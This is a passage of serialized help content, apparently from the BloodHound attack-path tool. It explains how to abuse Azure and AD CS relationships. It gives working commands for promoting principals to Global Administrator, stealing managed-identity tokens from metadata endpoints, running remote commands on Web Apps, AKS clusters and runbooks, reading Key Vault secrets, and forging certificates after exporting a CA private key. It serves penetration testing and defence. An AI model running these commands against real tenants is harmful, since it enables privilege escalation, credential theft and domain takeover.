RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"'New-AppRoleAssignment `\n    -SPObjectId \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -AppRoleID \"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8\" `\n    -ResourceID \"9858020a-4c00-4399-9ae4-e7897a8333fa\" `\n    -Token $MGToken'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK's New-AzureADRoleAssignment."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AzureADRoleAssignment `\n    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `\n    -Token $MGToken"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMGGrantRole","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's New-AzureADRoleAssignment."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AzureADRoleAssignment `\n    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `\n    -Token $MGToken"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMGAppRoleAssignment_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGApplication_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGDirectory_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGGroupMember_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGGroup_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGRoleManagement_ReadWrite_Directory","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZMGServicePrincipalEndpoint_ReadWrite_All","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZWebsiteContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk…\" `\n    -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use BARK's Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple \"whoami\" command:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-AzureRMWebAppShellCommand `\n    -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `\n    -Token $ARMToken `\n    -Command \"whoami\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PS C:> $PowerShellCommand = \n            $headers=@{\"X-IDENTITY-HEADER\"=$env:IDENTITY_HEADER}\n            $response = Invoke-WebRequest -UseBasicParsing -Uri \"$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01\" -Headers $headers\n            $response.RawContent\n\nPS C:> $base64Cmd = [System.Convert]::ToBase64String(\n            [System.Text.Encoding]::Unicode.GetBytes(\n                $PowerShellCommand\n            )\n        )\n\nPS C:> $Command = \"powershell -enc $($base64Cmd)\"\n\nPS C:> Invoke-AzureRMWebAppShellCommand `\n            -KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `\n            -token $ARMToken `\n            -Command $Command"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output will include a JWT for the managed identity service principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAddOwner","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-GraphTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk…\" `\n    -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To add a new owner to an App Registration, use BARK's New-AppOwner function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppOwner `\n    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAKSContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk…\" `\n    -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use BARK's Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple \"whoami\" command:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `\n    -Command \"whoami\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `\n    -Command 'curl -i -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\"'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output will include a JWT for the managed identity service principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAutomationContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$ARMToken = Get-ARMTokenWithRefreshToken ` \n    -RefreshToken \"0.ARwA6WgJJ9X2qk…\" ` \n    -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AzureAutomationAccountRunBook `\n    -Token $ARMToken `\n    -RunBookName \"MyCoolRunBook\" `\n    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" `\n    -Script \"whoami\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK's Get-AzureAutomationAccountRunBookOutput function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-AzureAutomationAccountRunBookOutput `\n    -Token $ARMToken `\n    -RunBookName \"MyCoolRunBook\" `\n    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$Script = $tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI; $tokenResponse.access_token\nNew-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" -Script $Script\nGet-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the output will include a JWT for the managed identity service principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZKeyVaultKVContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can read secrets and alter access policies (grant yourself access to read secrets)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent","children":"Get-AzureKeyVaultContent"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent","children":"Export-AzureKeyVaultContent"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZLogicAppContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Currently you need access to the portal GUI to execute this abuse."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can see a full walkthrough for executing that abuse in this blog post:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://medium.com/p/52b29354fc54","children":"Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZNodeResourceGroup","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emiting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZRoleApprover","windows":{},"linux":{},"abuse":{}},{"technique":"AZRoleEligible","windows":{},"linux":{},"abuse":{}},{"technique":"Enroll","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Certify can be used to enroll a certificate:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The following requirements must be met for a principal to be able to enroll a certificate:",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"1) The principal has enrollment rights on a certificate template",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) The certificate template is published on an enterprise CA",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"3) The principal has Enroll permission on the enterprise CA",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Certipy can be used to enroll a certificate:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The following requirements must be met for a principal to be able to enroll a certificate:",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"1) The principal has enrollment rights on a certificate template",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) The certificate template is published on an enterprise CA",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"3) The principal has Enroll permission on the enterprise CA",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"EnterpriseCAFor","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"RootCAFor","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"PublishedTo","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"NTAuthStoreFor","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"IssuedSignedBy","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"TrustedForNTAuth","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"HostsCAService","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"DelegatedEnrollmentAgent","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"EnrollOnBehalfOf","windows":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"linux":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."},"_owner":null,"_store":{}},"abuse":{}},{"technique":"GoldenCert","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Obtain CA certificate incl. private key - using built-in GUI (certsrv.msc)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1) Open certsrv.msc as Administrator on the enterprise CA host.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) Right-click on the enterprise CA and select \"All Tasks\" followed by \"Back up CA...\".",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"3) Click \"Next\", select \"Private key and CA certificate\", and select the location folder.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"4) Click \"Next\", and set a password.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"5) Click \"Next\" and click \"Finish\" to back up the certificate as a .p12 file."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Obtain CA certificate incl. private key - using commandline tools"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1) Print all certificates of the host using SharpDPAPI:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"SharpDPAPI.exe certificates /machine"},"_owner":null,"_store":{}},"The enterprise CA certificate is the one where issuer and subject are identical.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) Save the private key in .key file (e.g. cert.key) and the certificate in .pem file (cert.pem) in the same folder.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"3) Create a .pfx version of the CA certificate using certutil:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"certutil.exe -MergePFX .\\cert.pem .\\cert.pfx"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"4) Set password when prompted."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Forge certificate and obtain a TGT as targeted principal"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["1) Forge a certificate of a target principal using ForgeCert:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword \"password123!\" --Subject \"CN=User\" --SubjectAltName \"roshi@dumpster.fire\" --NewCertPath target.pfx --NewCertPassword \"NewPassword123!\""},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"2) Request a TGT for the targeted 